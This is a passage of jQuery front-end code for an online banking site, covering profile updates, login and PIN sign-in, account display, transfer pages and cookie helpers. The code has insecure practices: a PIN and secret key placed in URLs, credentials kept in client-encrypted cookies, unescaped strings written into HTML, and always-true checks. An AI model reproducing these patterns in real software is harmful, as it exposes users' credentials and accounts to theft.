                return false;
            } else {
                password = confirm_password;
                change_password = true;
            }
        }

        if (!$("#email").prop('disabled')) {
            if ((email.valueOf() != confirmemail.valueOf())) {
                alertMessage('.alert_model > .model-center', "Your password is not yet confirmed");
                $('#find_confrim_email_error').html("<i class='fa fa-info'></i> enter same email on <b>Confirm email</b>");
                return false;
            } else {
                email = confirmemail;
            }
        }


        var accountdata;
        var dob = day + "/" + month + "/" + year;

        var data = {
            user_Id: login_id,
            pin: case_1,
            title: title,
            firstname: firstname,
            othername: othername,
            lastname: lastname,
            gender: gender,
            dob: dob,
            maritalstatus: marital,
            Occupation: occupation,
            address: address,
            city: city,
            state: state,
            Zipcode: zipcode,
            nationality: nationality,
            mobile_num: mobile_number,
            email: email,
            nextofkin: NextOfKin,
            question: question,
            answer: answer,
            password: password
        };


        // // get image if changed imaged else use the user image
        upload_image(userimage.src, function(code, res) {
            try {

                if (code !== undefined || code !== null) {

                    if (code == 200) {
                        PUBLIC_ID_ACT = res.data.secure_url;
                        data['PUBLIC_ID_ACT'] = PUBLIC_ID_ACT;
                        data = JSON.stringify(data);
                        ajaxcall("/server/app/client_update.php", { client_update: data }, function(params, error) {

                            if (error) {
                                $.colorbox({
                                    html: '<div style="padding:10px;font-size:1.2em;font-family:Roboto,sans-serif"><p id="d">' + error + '</p></div>',
                                    width: "600px",
                                });
                            } else {
                                for (let index = 0; index < params.length; index++) {
                                    const element = params[index];
                                    if (element == "success") {

                                        if (change_password == true) {
                                            $.colorbox({
                                                html: '<div style="padding:10px;font-size:1.2em;font-family:Roboto,sans-serif"><p id="d">Password changed successfully<br> your account will be logged out in 5 seconds</p></div>',
                                                width: "600px",
                                            });
                                            setTimeout(() => {
                                                sign_out();
                                            }, 5000);

                                        } else {
                                            setCookies("PUBLIC_ID_ACT", PUBLIC_ID_ACT, null, {
                                                path: '/',
                                                expires: sessionexpire
                                            });
                                            $.colorbox({
                                                html: '<div style="padding:10px;font-size:1.2em;font-family:Roboto,sans-serif"><p id="d"> You have successfully updated your information please refresh your page to see the change</p></div>',
                                                width: "600px",
                                            });
                                            setTimeout(() => {
                                                window.location = "../personal/myaccounts";
                                            }, 2000);

                                        }

                                    }
                                }

                            }


                        });

                    } else
                    if (code == 404) {
                        throw "Resonse Code: " + code + " Error found on Insert Image: " + res;
                    } else
                    if (code == 503) {
                        throw "Resonse Code: " + code + " Error found on Insert Image: " + res;
                    }

                } else {
                    throw "Error Staus not found";
                }


            } catch (err) {
                $('#loading').fadeOut(100);
                $.colorbox({
                    html: '<div style="padding:10px;font-size:1.2em;font-family:Roboto,sans-serif"><p id="d">' + err + '</p></div>',
                    width: "600px",
                });
            }


        });


    });
    //Upload image to cloudinary using axios http
    function upload_image(file, callback) {
        $('#loading').fadeIn(100);

        if (file !== undefined && file !== null) {
            var formdata = new FormData();
            formdata.append("file", file);
            formdata.append("upload_preset", CLOUDNARY_UPLOAD_PRESET);
            if (typeof axios !== "undefined") {

                axios({
                    url: CLOUDNARY_URL,
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    data: formdata
                }).then(function(data) {
                    $('#loading').fadeOut(100);
                    let response = 200;
                    callback(response, data);
                }).catch(function(err) {
                    let response = 404;
                    callback(response, err);
                    return false;
                });


            } else {
                let response = 503;
                callback(response, "No internet Connection ");
                return false;

            }
        }
    }


    var s, d;

    function getAccountData(url, datasent, setinterval = null, callback = null) {

        var datasent = datasent;


        $.ajax({

            type: "GET",
            url: url,
            data: datasent,
            cache: false,
            dataType: 'json',
            success: function(res) {
                var o = parseInt(res[0].amount);
                setCookies("currency", res[0].currency, KEY_ENC);

                if (find_pagename("myaccounts") == true) {


                    if (res[0].account_default == "true" && res[0].account_default !== undefined && res[0].account_default != "false") {
                        s = res[0].firstname;
                        d = res[0].lastname;

                        if (account_name !== undefined) account_name.innerHTML = res[0].firstname + " " + res[0].lastname;

                        if (account_number !== undefined) account_number.innerHTML = res[0].accountnumber;

                        if (account_status !== undefined) account_status.innerHTML = res[0].accountstatus;

                        if (account_type !== undefined) account_type.innerHTML = res[0].accounttype;

                        if (account_balance !== undefined) account_balance.innerHTML = format(o, currency[res[0].currency]);
                        if (select_account !== undefined && setinterval !== true) {
                            add_rows(select_account, 1, [res[0].accounttype + " <span style='color:gold;font-size:1.4em'>&#x2605;</span>", res[0].accountnumber, format(o, currency[res[0].currency])]);
                        }


                        if (res[0].accountstatus == 'Inactive') {
                            $(".inactive").css("display", "block");

                        } else {}





                    } else if (res[0].account_default == "false" && res[0].account_default != "true") {


                        if (account_name !== undefined) account_name.innerHTML = res[0].firstname + " " + res[0].lastname;

                        if (account_number !== undefined) account_number.innerHTML = res[0].accountnumber;

                        if (account_status !== undefined) account_status.innerHTML = res[0].accountstatus;

                        if (account_type !== undefined) account_type.innerHTML = res[0].accounttype;

                        if (account_balance !== undefined) account_balance.innerHTML = format(o, currency[res[0].currency]);


                        if (select_account !== undefined) { add_rows(select_account, 1, [res[0].accounttype, res[0].accountnumber, format(o, currency[res[0].currency])]) };


                        if (res[0].accountstatus == 'Inactive') {
                            $(".inactive").css("display", "block");

                        } else {}



                        if (side_fullname !== undefined) side_fullname.innerHTML = s + " " + d;
                        if (side_status !== undefined) side_status.innerHTML = res[0].accountstatus;
                        if (side_balance !== undefined) side_balance.innerHTML = format(o, currency[res[0].currency]);
                        if (last_login !== undefined) last_login.innerHTML = res[1].login_date_time;
                        if (login_ip !== undefined) login_ip.innerHTML = res[1].ip_address;

                        if (res[0].accountstatus == 'Inactive') {
                            $(".inactive").css("display", "block");
                            $(".pending").css("display", "none");
                        } else if (res[0].accountstatus == 'Pending') {
                            $(".pending").css("display", "block");
                            $(".inactive").css("display", "none");
                        } else {}



                    }
                    //operation for non default accounts
                    if (res[0].account_default !== undefined && res[0].account_default == "false" && res[0].account_default == "true") {

                        for (var i = 0; i < res.length; i++) {
                            var o = parseInt(res[i].amount);
                            if (res[i].accountnumber !== undefined) {
                                if (select_account !== undefined) add_rows(select_account, 1, [res[i].accounttype, res[i].accountnumber, format(o, currency[res[i].currency])]);
                            }

                        }

                    }




                } else if (find_pagename("myprofile")) {
                    if (typeof callback === "function") {
                        // safe to use the function
                        if (res !== null) {

                            callback(res);
                        }

                    }
                } else {
                    if (typeof callback === "function") {
                        // safe to use the function
                        if (res !== null) {

                            callback(res);
                        }

                    }
                }



                //side-left bar details

                if (res[0].account_default == "true" || res[0].account_default !== undefined) {

                    if (side_fullname !== undefined) side_fullname.innerHTML = res[0].firstname + " " + res[0].lastname;
                    if (side_status !== undefined) side_status.innerHTML = res[0].accountstatus;
                    if (side_balance !== undefined) side_balance.innerHTML = format(o, currency[res[0].currency]);
                    if (last_login !== undefined) last_login.innerHTML = res[1].login_date_time;
                    if (login_ip !== undefined) login_ip.innerHTML = res[1].ip_address;

                    if (res[0].accountstatus == 'Inactive') {
                        $(".inactive").css("display", "block");
                        $(".pending").css("display", "none");
                    } else if (res[0].accountstatus == 'Pending') {
                        $(".pending").css("display", "block");
                        $(".inactive").css("display", "none");
                    } else {}
                    setCookies("_ust_", res[0].accountstatus, KEY_ENC);
                }

                var gotoTransferPage = function(a) { return a.substring(a.lastIndexOf("?") + 1); };
                var transeferpage = gotoTransferPage(window.location.hash);

                if (find_pagename("services") || transeferpage == "SameaccountTransfer" || transeferpage == "OtheraccountTransfer" && res[0].account_default == "true" || res[0].account_default == "false") {

                    let _er = document.getElementById("_er");
                    let _r = document.getElementById("_r");
                    let limit = document.getElementById("limit");
                    let limit_ = document.getElementById("limit_");
                    let from_ = document.getElementsByClassName("from_");
                    let to_ = document.getElementsByClassName("to_");

                    _er.innerHTML = res[0].currency;
                    _r.innerHTML = res[0].currency;
                    const trans_limit = res[0].transaction_limit;

                    //transaction limit : if limit is empty in database set to default limit (10,000)
                    if (trans_limit != "" || trans_limit != null || trans_limit !== undefined) {
                        limit.innerHTML = format(parseFloat(trans_limit));
                        limit_.innerHTML = format(parseFloat(trans_limit));
                    } else {
                        limit.innerHTML = format(10000);
                        limit_.innerHTML = format(10000);
                    }


                }







            },
            error: function(resd) {
                return resd;
            }

        });


    }





    function verifypin() {

    }




    //starting time for geting date
    function startTime() {
        var today = new Date();
        var h = today.getHours();
        var m = today.getMinutes();
        var s = today.getSeconds();
        var month = today.getMonth();
        var day = today.getDay();
        var year = today.getFullYear();
        var montharray = new Array("January", "February", "March", "April", "May", "June",
            "July", "August", "September", "October", "November", "December");

        var dayarray = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday",
            "Friday", "Saturday");
        m = checkTime(m);
        s = checkTime(s);

        var loggedindatehtml = document.getElementById("date-time");

        if (loggedindatehtml !== null) {
            document.getElementById('date-time').innerHTML =
                montharray[month] + ",  " + dayarray[day] + " " + year + " &nbsp;" + h + ":" + m + ":" + s;
            var t = setTimeout(startTime, 500);
        }

    }

    function checkTime(i) {
        if (i < 10) { i = "0" + i }; // add zero in front of numbers < 10
        return i;
    }
    //end starting and checking of date



    window.onload = startTime();

    var head_title = document.getElementById('head-title');
    if (head_title !== null) {
        head_title.innerHTML = "Hi! " + b;
    }
    var startStop = $('.start-stop');
    startStop.hover(
        function(e) {
            var child = startStop.children('div');
            if (child.hasClass('play_custom'))
                child.css('background-image', 'url("/images/layout/play_hover.png")');
            else
                child.css('background-image', 'url("/images/layout/stop_hover.png")');
        },
        function(e) {
            var child = startStop.children('div');
            if (child.hasClass('play_custom'))
                child.css('background-image', 'url("/images/layout/play.png")');
            else
                child.css('background-image', 'url("/images/layout/stop.png")');
        }
    );

    $("a[target='_blank']").bind('click', function() {
        var link = $(this).attr('href');
        // omit if the user clicks on login button
        if ($(this).attr('class') != "login-btn") {
            $.colorbox({
                html: '<div style="padding:10px;"><p>NOTE: You are leaving the Merican Bank website. If you wish to continue you may do so by clicking on the OK button. Otherwise, return to the Merican Bank website by clicking the CANCEL button.</p><p><button onclick=\'window.open(\"' + link + '");$.fn.colorbox.close()\' style="width:45px;">OK</button><button onclick="$.fn.colorbox.close()" style="margin-left:30px;width:60px;">Cancel</button></p></div>',
                width: "600px"
            });
        }
        return false;
    });

    $('li.panel').css('visibility', 'visible');

    initLoginForm();

    hardcodeFAQ();
});

function hardcodeFAQ() {
    $('dt.label a').each(function() {
        if ($(this).attr('href') == "/business/banking/mobile-banking/faq" || $(this).attr('href') == "/personal/banking/mobile-banking/faq")
            $(this).attr('href', "/ask-us/frequently-asked-questions#mobile");
    });
}

var continueLogin = false;

function initLoginForm() {
    //autoclear
    $('form#login-box input#user_id').click(function() {
        if ($(this).val() == "User Name") {
            $(this).val("");
        }
    }).blur(function() {
        if ($(this).val() == "") {
            $(this).val("User Name");
        }
    });

    $('form#login-box input.pass').click(function() {
        if ($(this).val() == "Pin") {
            $(this).val("");
        }
    }).blur(function() {
        if ($(this).val() == "") {
            $(this).val("Pin");
        }
    });



    $('form#login-box').submit(function() {
        var sessionexpire = new Date(new Date().getTime() + 60 * 170 * 60 * 1000);

        var a = getCookies("_bankmerican231", KEY_ENC);
        var b = getCookies("user", KEY_ENC);
        var c = getCookies("userpass", KEY_ENC);
        var d = getCookies("_hi_", KEY_ENC);

        var alertbox = document.getElementById('alert');
        var user = $("input[name=user]").val();
        var pin = $("input[name=pass]").val();
        var dataSent = 'user=' + user + '&pin=' + pin;

        if ($('html').hasClass('lt_ie10')) {
            $('form#login-box').attr('action', '/login-announcement').attr('target', '_blank');
            setTimeout(clearLogin, 1000);
            return true;
        } else {
            if ($('form#login-box input#user_id').val() == "" || $('form#login-box input#user_id').val() == "User Name") {
                $.colorbox({
                    html: '<div style="padding:10px;font-size:1.2em"><p>Please enter a valid User Name.<br />If you do not have a User Name, please <a href="https:"+href.location+"/personal/banking/online-banking/enroll-now" title="Enroll Now">Enroll Now</a></p></div>',
                    width: "600px"
                });
                return false;
            } else
            if ($('form#login-box input#pass').val() == "" || $('form#login-box input#pass').val() == "Pin") {
                $.colorbox({
                    html: '<div style="padding:10px;font-size:1.2em"><p>Please enter a valid Pin number.<br />If you do not have a Pin number, please contact customer service</div>',
                    width: "600px"
                });
                return false;
            } else {
                continueLogin = true;

                $.ajax({

                    type: "POST",
                    url: './server/signin.php',
                    data: dataSent,
                    cache: false,
                    dataType: 'json',
                    success: function(result) {
                        $("#loading").fadeIn(500);

                        setTimeout(function functionName() {
                            $("#loading").fadeOut(500);

                            if (result.user || result.PUBLIC_ID_ACT || result.pin) {
                                if (a !== undefined && b !== undefined && c !== undefined && d !== undefined) {
                                    $.colorbox({
                                        html: '<div style="padding:10px;font-size:1.2em"><p>You are already signed in with this username and pin <br/> click <a href="./personal/myaccounts"><b>here</b></a> to go to you Account page</div>',
                                        width: "600px"
                                    });
                                    return false;

                                } else {
                                    setTimeout(function functionName() {
                                        setCookies("userpass", result.user, KEY_ENC, {
                                            path: '/',
                                            expires: sessionexpire
                                        });
                                        setCookies("PUBLIC_ID_ACT", result.PUBLIC_ID_ACT, null, {
                                            path: '/',
                                            expires: sessionexpire
                                        });
                                        window.location = './personal/EntryPass.html';
                                    }, 2000);

                                }

                            } else if (result.error) {

                                $.colorbox({
                                    html: '<div style="padding:10px;font-size:1em"><p id="d"></p></div>',
                                    width: "600px",
                                    height: "129px"
                                });
                                document.getElementById("d").innerHTML = "<b>" + result.error + " <br> Please contact Customer care on : <a href='mailto:support.customercare@bankmerican.com?Subject=Help Me Login failed' target='_top'>support.customercare@bankmerican.com</a></b>";



                                setTimeout(function functionName() {
                                    return true;
                                }, 2000);

                                return false;
                            }

                        }, 2000);

                    },
                    error: function(err) {

                        $.colorbox({
                            html: '<div style="padding:10px;font-size:1em"><p id="d"></p></div>',
                            width: "600px",
                            height: "129px"
                        });

                        document.getElementById("d").innerHTML = "<b>Error 505: <br> Please contact Customer care on : <a href='mailto:support.customercare@bankmerican.com?Subject=Help Me Login failed' target='_top'>support.customercare@bankmerican.com</a></b>";
                    }

                });

                event.preventDefault();
            }



        }
    });

}


//transfer funds script starting

var _ust_ = getCookies("_ust_", KEY_ENC);

var same_button = document.getElementById("same-account-btn");
var other_button = document.getElementById("other-account-btn");
var s = document.getElementById("same-bank-content");
var o = document.getElementById("other-bank-content");
var t = document.getElementById("transfer-choice");

var possibleUrls = new Array("SameaccountTransfer", "OtheraccountTransfer");
var sameaccount = possibleUrls[0];
var otheraccount = possibleUrls[1];


var gotoTransferPage = function(a) { return a.substring(a.lastIndexOf("?") + 1); };
var transeferpage = gotoTransferPage(window.location.hash);





if (find_pagename("services") && typeof transeferpage !== undefined && transeferpage == sameaccount) {

    switch (_ust_) {
        case "Pending":

            $('.model .pending').slideDown("2000").css("visibility", "visible");
            setTimeout(function() {
                $('.model .pending').slideUp('1000');
            }, 3000);
            setTimeout(function() {
                $('.model .pending')[0].style.visibility = "hidden";
            }, 4000);

            break;

        case "Inactive":

            $('.model .inactive').slideDown("2000").css("visibility", "visible");
            setTimeout(function() {
                $('.model .inactive').slideUp('1000');
            }, 3000);
            setTimeout(function() {
                $('.model .inactive')[0].style.visibility = "hidden";
            }, 4000);
            break;

        default:
            $('#comb').css("visibility", "visible");
            t.style.display = "none";
            o.style.display = "none";
            s.style.display = "block";
            break;

    }



} else if (find_pagename("services") && typeof transeferpage !== undefined && transeferpage == otheraccount) {

    switch (_ust_) {
        case "Pending":

            $('.model .pending').slideDown("2000").css("visibility", "visible");
            setTimeout(function() {
                $('.model .pending').slideUp('1000');
            }, 3000);
            setTimeout(function() {
                $('.model .pending')[0].style.visibility = "hidden";
            }, 4000);

            break;

        case "Inactive":

            $('.model .inactive').slideDown("2000").css("visibility", "visible");
            setTimeout(function() {
                $('.model .inactive').slideUp('1000');
            }, 10000);
            setTimeout(function() {
                $('.model .inactive')[0].style.visibility = "hidden";
            }, 10500);
            break;

        default:
            $('#comb').css("visibility", "visible");
            document.getElementById("comb-same").innerHTML = "other account transfer";

            t.style.display = "none";
            s.style.display = "none";
            o.style.display = "block";
            break;

    }

} else if (find_pagename("services") && transeferpage == "") {

    $('#comb').css("visibility", "hidden");
    t.style.display = "block";
    s.style.display = "none";
    o.style.display = "none";
}


$('#want').click(function() {
    $('#comb').css("visibility", "hidden");

    t.style.display = "block";
    s.style.display = "none";
    o.style.display = "none";
});



if (same_button != undefined)
    same_button.onclick = function() {


        switch (_ust_) {
            case "Pending":


                if (find_pagename("services") && zounds !== undefined) {
                    zounds.playURL('../../styles/sound/alarm11.wav');
                    $('.model .pending').slideDown("2000").css("visibility", "visible");

                } else {
                    if (zounds !== undefined) {
                        zounds.playURL('../styles/sound/alarm1.wav');
                        $('.model .pending').slideDown("2000").css("visibility", "visible");
                    }
                }



                setTimeout(function() {
                    $('.model .pending').slideUp('1000');
                }, 2000);
                setTimeout(function() {
                    $('.model .pending')[0].style.visibility = "hidden";
                }, 2500);

                break;

            case "Inactive":



                if (find_pagename("services") && zounds !== undefined) {
                    zounds.playURL('../../styles/sound/alarm11.wav');
                    $('.model .inactive').slideDown("2000").css("visibility", "visible");
                } else {
                    if (zounds !== undefined) {
                        zounds.playURL('../styles/sound/alarm1.wav');
                        $('.model .inactive').slideDown("2000").css("visibility", "visible");
                    }
                }

                setTimeout(function() {
                    $('.model .inactive').slideUp('1000');
                }, 2000);
                setTimeout(function() {
                    $('.model .inactive')[0].style.visibility = "hidden";
                }, 2500);
                break;

            default:
                $('#comb').css("visibility", "visible");
                document.getElementById("comb-same").innerHTML = "Same account transfer";

                t.style.display = "none";
                s.style.display = "block";
                o.style.display = "none";
                break;

        }

    }

other_button.onclick = function() {

    switch (_ust_) {
        case "Pending":


            if (find_pagename("services") && zounds !== undefined) {
                zounds.playURL('../../styles/sound/alarm11.wav');
                $('.model .pending').slideDown("2000").css("visibility", "visible");

            } else {
                if (zounds !== undefined) {
                    zounds.playURL('../styles/sound/alarm1.wav');
                    $('.model .pending').slideDown("2000").css("visibility", "visible");
                }
            }

            setTimeout(function() {
                $('.model .pending').slideUp('1000');
            }, 2000);
            setTimeout(function() {
                $('.model .pending')[0].style.visibility = "hidden";
            }, 2500);

            break;

        case "Inactive":


            if (find_pagename("services") && zounds !== undefined) {
                zounds.playURL('../../styles/sound/alarm11.wav');
                $('.model .inactive').slideDown("2000").css("visibility", "visible");

            } else {
                if (zounds !== undefined) {
                    zounds.playURL('../styles/sound/alarm11.wav');
                    $('.model .inactive').slideDown("2000").css("visibility", "visible");
                }
            }


            setTimeout(function() {
                $('.model .inactive').slideUp('1000');
                zounds.stop();
            }, 2000);
            setTimeout(function() {
                $('.model .inactive')[0].style.visibility = "hidden";
            }, 2500);
            break;

        default:
            $('#comb').css("visibility", "visible");
            document.getElementById("comb-same").innerHTML = "other account transfer";

            t.style.display = "none";
            s.style.display = "none";
            o.style.display = "block";
            break;

    }

}



//find pagesname
function find_pagename(a) {
    var href = window.location.pathname;
    href = href.substring(href.lastIndexOf("/") + 1);
    href = href.split(".")[0];
    if (href == a)
        return true;
    if (href != a)
        return false;
}



function clearLogin() {
    $('form#login-box input#user_id').val('User Name');
}

function startBanner() {
    $('#inner-banner').css('visibility', 'visible');
    $('.start-stop').click();
}



function passwordlogin() {
    var sessionexpire = new Date(new Date().getTime() + 60 * 170 * 60 * 1000);


    var password = document.getElementById("ember1315").value;
    var passwordata = 'password=' + password;

    if (typeof password !== undefined && password != "") {
        $.ajax({

            type: "POST",
            url: '../server/signin.php',
            data: passwordata,
            cache: false,
            dataType: 'json',
            success: function(result) {
                $("#loading").fadeIn(500);

                setTimeout(function functionName() {
                    $("#loading").fadeOut(500);

                    if (result.success && result.pin) {

                        setCookies("user", result.success, KEY_ENC, {
                            path: '/',
                            expires: sessionexpire
                        });
                        setCookies("_hi_", result._hi_, KEY_ENC, {
                            path: '/',
                            expires: sessionexpire
                        });

                        setCookies("_bankmerican231", result.pin, KEY_ENC, {
                            path: '/',
                            expires: sessionexpire
                        });
                        setCookies("_bankmericansk", result.secret_key, KEY_ENC, {
                            path: '/',
                            expires: sessionexpire
                        });
                        $("#loading").fadeIn(500);
                        setTimeout(function functionName() {
                            //insert Account panel here
                            window.location = '../personal/myaccounts?' + result.pin + '& ' + result.secret_key;
                        }, 2000);

                    } else if (result.error) {
                        $("#loading").fadeOut(1000);
                        if (result.error == "Username and pin not set") {
                            window.open("../business.html", "_self");
                        } else {
                            $.colorbox({
                                html: '<div style="padding:10px;font-size:1.2em;font-family:Roboto,sans-serif"><p id="d">Password doesnt correct with account <br> <b>please contact customer care if forgot password</b> <br> Or click <span><a href="#">Here</a> to recover your password</span></p></div>',
                                width: "600px",
                            });
                        }
                        return false;

                    }

                }, 2000);

            }

        });


        event.preventDefault();
    } else {
        alert("Password cannot be empty");
    }

}

/* setCookies() funtion takes three arguments arg1 = cookie_key
arg2 = cookie_value, arg3 = privatekey for encrypting Cookies

privatekey is needed to decrypt getCookies

Encrytion is done using Cryto.js javascript lib
*/


function setCookies(key, value, privatekey = null, properties = null) {
    /* PROCESS
    // var encrypted = CryptoJS.AES.encrypt(value, encrypt);
    // var decrypted = CryptoJS.AES.decrypt(encrypted, myPassword);
    // alert(myString)
    // alert(encrypted)
    // alert(decrypted);
    // alert(decrypted.toString(CryptoJS.enc.Utf8));

    /* setCookies() funtion takes three arguments arg1 = cookie_key
    arg2 = cookie_value, arg3 =json object of properties for cookies (optional) , arg4 = privatekey for encrypting Cookies

    privatekey is needed to decrypt getCookies

    Encrytion is done using Cryto.js javascript lib AES cryption algorithim
    */
    if (properties == null) {
        properties = {
            path: '/'
        };
    }
    if (privatekey != null ||
        privatekey !== undefined &
        typeof(CryptoJS) !== 'undefined' &&
        typeof(salt) !== 'undefined') {
        value = CryptoJS.AES.encrypt(value, privatekey);
    }
    Cookies.set(key, value, properties);
}



/* getCookies() funtion takes two arguments arg1 = cookie_key
    arg2 = privatekey for encrypting Cookies

   same privatekey used for setCookie encryption is needed to decrypt getCookies
    */

function getCookies(a, p = null) {


    /* getCookies() funtion takes two arguments arg1 = cookie_key
   arg2 = privatekey used for encrypting {arg1}

   same encrytedkey and privatekey used
   for setCookie encryption is needed to decrypt getCookies
    */

    var e = Cookies.get(a);
    if (e != null && e !== undefined) {
        try {
            if (p != null) {
                a = CryptoJS.AES.decrypt(e, p);
                e = a.toString(CryptoJS.enc.Utf8);
                return e;
            }

        } catch (error) {
            return e;
        }
        return e;
    }

}

//preload images:
(function($) {
    var cache = [];
    // Arguments are image paths relative to the current page.
    $.preLoadImages = function() {
        var args_len = arguments.length;
        for (var i = args_len; i--;) {
            var cacheImage = document.createElement('img');
            cacheImage.src = arguments[i];
            cache.push(cacheImage);
        }
    }


})(jQuery);
$.preLoadImages('/images/layout/play_hover.png', '/images/layout/stop_hover.png');